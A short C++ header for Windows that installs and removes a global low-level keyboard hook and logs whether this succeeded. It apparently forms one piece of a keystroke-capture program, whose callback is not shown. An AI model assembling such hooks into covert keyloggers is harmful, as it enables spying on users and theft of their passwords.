#ifndef KEY_HOOK
#define KEY_HOOK

#include <windows.h>
#include "key_proc.h"
#include "file_handler.h"

namespace key_hook
{
    HHOOK hhook = NULL;

    bool create_hook()
    {
        hhook = SetWindowsHookExW(WH_KEYBOARD_LL, key_proc::kbdproc, NULL, 0);
        if (hhook == NULL)
        {
            file_handler::write_logs("Can't install Hook");
            return false;
        }
        file_handler::write_logs("Successfully installed Hook");
        return true;
    }

    bool delete_hook()
    {
        BOOL check = UnhookWindowsHookEx(hhook);
        if ((bool)check)
        {
            hhook = NULL;
            file_handler::write_logs("Successfully uninstalled Hook");
            return true;
        }
        file_handler::write_logs("Can't uninstall Hook");
        return false;
    }

} // namespace key_hook

#endif